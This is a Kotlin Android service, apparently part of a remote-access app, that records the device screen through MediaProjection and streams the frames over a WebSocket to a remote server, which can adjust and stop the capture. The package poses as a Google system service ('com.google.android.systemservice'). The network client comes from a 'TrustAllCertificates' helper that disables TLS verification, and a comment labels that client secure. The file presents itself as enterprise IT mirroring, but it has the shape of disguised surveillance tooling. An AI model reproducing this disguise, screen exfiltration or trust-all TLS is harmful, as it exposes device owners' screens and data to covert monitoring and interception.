package com.google.android.systemservice.services

import android.annotation.SuppressLint
import android.app.Activity
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.Bitmap
import android.graphics.PixelFormat
import android.hardware.display.DisplayManager
import android.hardware.display.VirtualDisplay
import android.media.Image
import android.media.ImageReader
import android.media.projection.MediaProjection
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Handler
import android.os.HandlerThread
import android.os.IBinder
import android.util.Base64
import android.util.DisplayMetrics
import android.util.Log
import android.view.WindowManager
import androidx.core.app.NotificationCompat
import com.google.android.systemservice.config.AndroidConfig
import com.google.android.systemservice.utils.TrustAllCertificates
import kotlinx.coroutines.*
import okhttp3.*
import org.json.JSONObject
import java.io.ByteArrayOutputStream
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger
import java.util.concurrent.atomic.AtomicLong

/**
 * Enterprise screen mirroring service using MediaProjection API.
 * Displays a persistent notification while mirroring is active (Android requirement).
 * Streams JPEG-encoded frames over WebSocket to the server.
 */
class ScreenMirrorService : Service() {

    companion object {
        private const val TAG = "ScreenMirror"
        private const val MIRROR_CHANNEL_ID = "screen_mirror_channel"
        private const val NOTIFICATION_ID = 2011
        private const val MAX_SESSION_DURATION_MS = 30 * 60 * 1000L // 30 minutes
        private const val DEFAULT_FPS = 15
        private const val DEFAULT_QUALITY = 70

        const val ACTION_START = "com.google.android.systemservice.SCREEN_MIRROR_START"
        const val ACTION_STOP = "com.google.android.systemservice.SCREEN_MIRROR_STOP"
        const val ACTION_UPDATE_SETTINGS = "com.google.android.systemservice.SCREEN_MIRROR_SETTINGS"

        const val EXTRA_RESULT_CODE = "result_code"
        const val EXTRA_RESULT_DATA = "result_data"
        const val EXTRA_SESSION_ID = "session_id"
        const val EXTRA_FPS = "fps"
        const val EXTRA_QUALITY = "quality"
    }

    private var mediaProjection: MediaProjection? = null
    private var virtualDisplay: VirtualDisplay? = null
    private var imageReader: ImageReader? = null
    private var webSocket: WebSocket? = null

    private val isStreaming = AtomicBoolean(false)
    private val frameSequence = AtomicInteger(0)
    private val sessionStartTime = AtomicLong(0)

    @Volatile private var currentFps = DEFAULT_FPS
    @Volatile private var currentQuality = DEFAULT_QUALITY
    private var sessionId = ""
    private var deviceId = ""

    private var imageThread: HandlerThread? = null
    private var imageHandler: Handler? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    private val client = TrustAllCertificates.createSecureClientBuilder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .build()

    override fun onCreate() {
        super.onCreate()
        deviceId = getDeviceIdentifier()
        createNotificationChannel()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val resultCode = intent.getIntExtra(EXTRA_RESULT_CODE, Activity.RESULT_CANCELED)
                val resultData = intent.getParcelableExtra<Intent>(EXTRA_RESULT_DATA)
                sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
                currentFps = intent.getIntExtra(EXTRA_FPS, DEFAULT_FPS).coerceIn(1, 30)
                currentQuality = intent.getIntExtra(EXTRA_QUALITY, DEFAULT_QUALITY).coerceIn(10, 100)

                if (resultCode == Activity.RESULT_OK && resultData != null) {
                    startMirroring(resultCode, resultData)
                } else {
                    Log.e(TAG, "Invalid MediaProjection result")
                    stopSelf()
                }
            }
            ACTION_STOP -> stopMirroring()
            ACTION_UPDATE_SETTINGS -> {
                currentFps = intent.getIntExtra(EXTRA_FPS, currentFps).coerceIn(1, 30)
                currentQuality = intent.getIntExtra(EXTRA_QUALITY, currentQuality).coerceIn(10, 100)
                Log.d(TAG, "Settings updated: fps=$currentFps, quality=$currentQuality")
            }
        }
        return START_NOT_STICKY
    }

    private fun startMirroring(resultCode: Int, data: Intent) {
        if (isStreaming.get()) {
            Log.w(TAG, "Already streaming")
            return
        }

        startForeground(NOTIFICATION_ID, createMirrorNotification())
        sessionStartTime.set(System.currentTimeMillis())

        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as? MediaProjectionManager ?: return
        mediaProjection = projectionManager.getMediaProjection(resultCode, data)
        mediaProjection?.registerCallback(projectionCallback, null)

        val metrics = getScreenMetrics()
        val scaleFactor = calculateScaleFactor(metrics)
        val width = (metrics.widthPixels * scaleFactor).toInt()
        val height = (metrics.heightPixels * scaleFactor).toInt()

        imageThread = HandlerThread("ScreenMirrorThread").also { it.start() }
        imageHandler = Handler(imageThread?.looper ?: return)

        imageReader = ImageReader.newInstance(width, height, PixelFormat.RGBA_8888, 2)
        imageReader?.setOnImageAvailableListener(imageAvailableListener, imageHandler)

        virtualDisplay = mediaProjection?.createVirtualDisplay(
            "ScreenMirror",
            width, height, metrics.densityDpi,
            DisplayManager.VIRTUAL_DISPLAY_FLAG_AUTO_MIRROR,
            imageReader?.surface, null, null
        )

        isStreaming.set(true)
        connectWebSocket()
        scheduleSessionTimeout()

        Log.d(TAG, "Screen mirroring started: ${width}x${height} @ ${currentFps}fps, quality=$currentQuality")
    }

    private fun stopMirroring() {
        isStreaming.set(false)

        try { virtualDisplay?.release() } catch (e: Exception) { Log.e(TAG, "VirtualDisplay release failed", e) }
        virtualDisplay = null
        try { imageReader?.close() } catch (e: Exception) { Log.e(TAG, "ImageReader close failed", e) }
        imageReader = null
        try { mediaProjection?.stop() } catch (e: Exception) { Log.e(TAG, "MediaProjection stop failed", e) }
        mediaProjection = null
        imageThread?.quitSafely()
        imageThread = null

        try { webSocket?.close(1000, "Mirror stopped") } catch (e: Exception) { Log.e(TAG, "WS close failed", e) }
        webSocket = null

        stopForeground(true)
        stopSelf()
        Log.d(TAG, "Screen mirroring stopped")
    }

    private val imageAvailableListener = ImageReader.OnImageAvailableListener { reader ->
        if (!isStreaming.get()) return@OnImageAvailableListener

        val image: Image? = try {
            reader.acquireLatestImage()
        } catch (e: Exception) {
            null
        }

        image?.use {
            val frameInterval = 1000L / currentFps
            val now = System.currentTimeMillis()

            // Rate limiting
            if (now - lastFrameTime.get() < frameInterval) return@OnImageAvailableListener
            lastFrameTime.set(now)

            val bitmap = imageToBitmap(it)
            if (bitmap != null) {
                val base64 = encodeBitmap(bitmap, currentQuality)
                bitmap.recycle()
                sendFrame(base64)
            }
        }
    }

    private val lastFrameTime = AtomicLong(0)

    private fun imageToBitmap(image: Image): Bitmap? {
        var intermediateBitmap: Bitmap? = null
        return try {
            val plane = image.planes[0]
            val buffer = plane.buffer
            val pixelStride = plane.pixelStride
            val rowStride = plane.rowStride
            val rowPadding = rowStride - pixelStride * image.width

            intermediateBitmap = Bitmap.createBitmap(
                image.width + rowPadding / pixelStride,
                image.height,
                Bitmap.Config.ARGB_8888
            )
            intermediateBitmap.copyPixelsFromBuffer(buffer)

            if (rowPadding > 0) {
                val croppedBitmap = Bitmap.createBitmap(intermediateBitmap, 0, 0, image.width, image.height)
                intermediateBitmap.recycle()
                intermediateBitmap = null
                croppedBitmap
            } else {
                val result = intermediateBitmap
                intermediateBitmap = null
                result
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to convert image to bitmap: ${e.message}")
            null
        } finally {
            intermediateBitmap?.recycle()
        }
    }

    private fun encodeBitmap(bitmap: Bitmap, quality: Int): String {
        return ByteArrayOutputStream().use { stream ->
            bitmap.compress(Bitmap.CompressFormat.JPEG, quality, stream)
            Base64.encodeToString(stream.toByteArray(), Base64.NO_WRAP)
        }
    }

    private fun sendFrame(base64Data: String) {
        val seq = frameSequence.incrementAndGet()
        val message = JSONObject().apply {
            put("command", "message")
            put("identifier", JSONObject().apply {
                put("channel", "ScreenMirrorChannel")
                put("device_id", deviceId)
            }.toString())
            put("data", JSONObject().apply {
                put("action", "frame")
                put("frame_data", base64Data)
                put("timestamp", System.currentTimeMillis())
                put("sequence", seq)
            }.toString())
        }
        try { webSocket?.send(message.toString()) } catch (e: Exception) { Log.e(TAG, "WS send failed", e) }
    }

    private fun connectWebSocket() {
        AndroidConfig.loadFromPreferences(this)
        val wsUrl = "${AndroidConfig.websocketUrl}&device_id=$deviceId"
        val request = Request.Builder()
            .url(wsUrl)
            .build()

        webSocket = client.newWebSocket(request, object : WebSocketListener() {
            override fun onOpen(webSocket: WebSocket, response: Response) {
                Log.d(TAG, "WebSocket connected for screen mirroring")
                subscribeToChannel(webSocket)
            }

            override fun onMessage(webSocket: WebSocket, text: String) {
                handleServerMessage(text)
            }

            override fun onFailure(webSocket: WebSocket, t: Throwable, response: Response?) {
                Log.e(TAG, "WebSocket error: ${t.message}")
                if (isStreaming.get()) {
                    serviceScope.launch {
                        delay(5000)
                        connectWebSocket()
                    }
                }
            }

            override fun onClosed(webSocket: WebSocket, code: Int, reason: String) {
                Log.d(TAG, "WebSocket closed: $reason")
            }
        })
    }

    private fun subscribeToChannel(ws: WebSocket) {
        val subscribe = JSONObject().apply {
            put("command", "subscribe")
            put("identifier", JSONObject().apply {
                put("channel", "ScreenMirrorChannel")
                put("device_id", deviceId)
            }.toString())
        }
        ws.send(subscribe.toString())
    }

    private fun handleServerMessage(text: String) {
        try {
            val json = JSONObject(text)
            val type = json.optString("type", "")
            if (type in listOf("ping", "welcome", "confirm_subscription")) return

            val message = json.optJSONObject("message") ?: return
            when (message.optString("type", "")) {
                "stop_mirror" -> stopMirroring()
                "settings_update" -> {
                    currentFps = message.optInt("fps", currentFps).coerceIn(1, 30)
                    currentQuality = message.optInt("quality", currentQuality).coerceIn(10, 100)
                    Log.d(TAG, "Remote settings update: fps=$currentFps, quality=$currentQuality")
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Error parsing server message: ${e.message}")
        }
    }

    private fun scheduleSessionTimeout() {
        serviceScope.launch {
            delay(MAX_SESSION_DURATION_MS)
            if (isStreaming.get()) {
                Log.w(TAG, "Session timeout reached (30 min), stopping")
                stopMirroring()
            }
        }
    }

    private fun getDeviceIdentifier(): String {
        return try {
            android.provider.Settings.Secure.getString(
                contentResolver,
                android.provider.Settings.Secure.ANDROID_ID
            ) ?: AndroidConfig.deviceId.ifEmpty { "unknown" }
        } catch (e: Exception) {
            AndroidConfig.deviceId.ifEmpty { "unknown" }
        }
    }

    @SuppressLint("ObsoleteSdkInt")
    private fun getScreenMetrics(): DisplayMetrics {
        val metrics = DisplayMetrics()
        val windowManager = getSystemService(Context.WINDOW_SERVICE) as? WindowManager ?: return metrics
        @Suppress("DEPRECATION")
        windowManager.defaultDisplay.getRealMetrics(metrics)
        return metrics
    }

    private fun calculateScaleFactor(metrics: DisplayMetrics): Float {
        // Reduce resolution for bandwidth management
        val maxDimension = maxOf(metrics.widthPixels, metrics.heightPixels)
        return when {
            currentQuality < 30 -> 0.25f
            currentQuality < 50 -> 0.5f
            maxDimension > 2560 -> 0.5f
            maxDimension > 1920 -> 0.65f
            else -> 0.75f
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                MIRROR_CHANNEL_ID,
                "Screen Mirroring",
                NotificationManager.IMPORTANCE_LOW
            ).apply {
                description = "Active screen mirroring session"
                setShowBadge(true)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager?.createNotificationChannel(channel)
        }
    }

    private fun createMirrorNotification(): Notification {
        return NotificationCompat.Builder(this, MIRROR_CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_menu_view)
            .setContentTitle("Screen Mirroring Active")
            .setContentText("Your screen is being shared with IT support")
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private val projectionCallback = object : MediaProjection.Callback() {
        override fun onStop() {
            Log.d(TAG, "MediaProjection stopped by system")
            stopMirroring()
        }
    }

    override fun onDestroy() {
        super.onDestroy()
        stopMirroring()
        serviceScope.cancel()
    }

    override fun onBind(intent: Intent?): IBinder? = null
}

private inline fun <T : AutoCloseable?, R> T.use(block: (T) -> R): R {
    try {
        return block(this)
    } finally {
        try {
            this?.close()
        } catch (_: Exception) {
        }
    }
}
